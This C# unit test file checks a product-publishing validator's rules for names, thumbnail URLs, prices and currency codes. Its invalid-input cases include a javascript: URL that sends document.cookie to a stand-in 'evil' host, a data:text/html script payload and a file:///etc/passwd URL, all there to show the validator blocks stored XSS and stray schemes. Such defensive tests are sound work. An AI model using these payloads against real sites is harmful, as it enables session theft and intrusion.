using Catalog.Application.Products.PublishProduct;
using FluentValidation.Results;
using Shouldly;
using Xunit;

namespace Catalog.Application.Tests;

public class PublishProductValidatorTests
{
    private static readonly PublishProductValidator Validator = new();

    private static PublishProductCommand Valid() =>
        new(Guid.CreateVersion7(), "Walnut desk", "https://cdn.example/desk.jpg", 19.99m, "EUR");

    [Fact]
    public void A_valid_command_passes()
    {
        Validator.Validate(Valid()).IsValid.ShouldBeTrue();
    }

    [Fact]
    public void A_missing_thumbnail_is_valid()
    {
        Validator.Validate(Valid() with { ThumbnailUrl = null }).IsValid.ShouldBeTrue();
    }

    [Theory]
    [InlineData("https://cdn.example/desk.jpg")]
    [InlineData("http://cdn.example/desk.jpg")]
    [InlineData("HTTPS://CDN.EXAMPLE/desk.jpg")]
    [InlineData("https://cdn.example/desk.jpg?v=2&size=large")]
    public void An_http_thumbnail_is_valid(string url)
    {
        // The positive half, since a rule refusing every URL passes every case in Invalid(). The upper-case
        // scheme is here because Uri.Scheme normalises to lower case.
        Validator.Validate(Valid() with { ThumbnailUrl = url }).IsValid.ShouldBeTrue(url);
    }

    [Fact]
    public void A_zero_amount_is_valid()
    {
        // Free is a price; Money.Of agrees. The refused half is negative.
        Validator.Validate(Valid() with { Amount = 0m }).IsValid.ShouldBeTrue();
    }

    public static TheoryData<string, PublishProductCommand> Invalid() => new()
    {
        // An omitted CommandId binds as Guid.Empty, one shared idempotency key rather than an absent one (§8.5).
        { nameof(PublishProductCommand.CommandId), Valid() with { CommandId = Guid.Empty } },
        { nameof(PublishProductCommand.Name), Valid() with { Name = "" } },
        { nameof(PublishProductCommand.Name), Valid() with { Name = new string('x', 201) } },
        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = new string('x', 401) } },
        // Served to every reader of the catalogue (§6.5), and a javascript: or data:text/html URL bound into an
        // href is stored XSS.
        {
            nameof(PublishProductCommand.ThumbnailUrl),
            Valid() with { ThumbnailUrl = "javascript:fetch('//evil/'+document.cookie)" }
        },
        {
            nameof(PublishProductCommand.ThumbnailUrl),
            Valid() with { ThumbnailUrl = "data:text/html;base64,PHNjcmlwdD4=" }
        },
        // A scheme with no use here; the rule is an allow-list of two rather than a deny-list.
        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "file:///etc/passwd" } },
        // Relative: no scheme to refuse, and nothing here serves an origin the
        // catalogue's images would be relative to.
        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "/images/desk.jpg" } },
        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "not a url at all" } },
        { nameof(PublishProductCommand.Amount), Valid() with { Amount = -0.01m } },
        // decimal(19,4)'s integer capacity — past it the write fails at
        // SaveChanges as a 500, which is the wrong blame for bad input.
        { nameof(PublishProductCommand.Amount), Valid() with { Amount = 1_000_000_000_000_000m } },
        // The rounding boundary: Money.Of rounds half-to-even at two places,
        // so this value becomes exactly 1e15 and overflows despite sitting
        // under a naive < 1e15 bound.
        { nameof(PublishProductCommand.Amount), Valid() with { Amount = 999_999_999_999_999.995m } },
        { nameof(PublishProductCommand.Currency), Valid() with { Currency = "EURO" } },
        { nameof(PublishProductCommand.Currency), Valid() with { Currency = "" } },
        // Three characters is not three letters — "1$?" must be refused here
        // as input, not by Money.Of as a bug (§5.7's division).
        { nameof(PublishProductCommand.Currency), Valid() with { Currency = "1$?" } },
        // .NET's $ anchor matches before a trailing newline; only \z makes
        // "EUR\n" fail here rather than on Money.Of's length guard.
        { nameof(PublishProductCommand.Currency), Valid() with { Currency = "EUR\n" } },
        // Matches alone skips null — the rule needs NotEmpty for a JSON
        // "currency": null to stay a 400 rather than a DomainException.
        { nameof(PublishProductCommand.Currency), Valid() with { Currency = null! } }
    };

    [Theory]
    [MemberData(nameof(Invalid))]
    public void An_invalid_field_fails_naming_the_field(string field, PublishProductCommand command)
    {
        ValidationResult result = Validator.Validate(command);

        result.IsValid.ShouldBeFalse();
        result.Errors.ShouldContain(
            f => f.PropertyName == field,
            "the 400's errors extension is field-keyed (§10.5), so the name is the contract");
    }
}
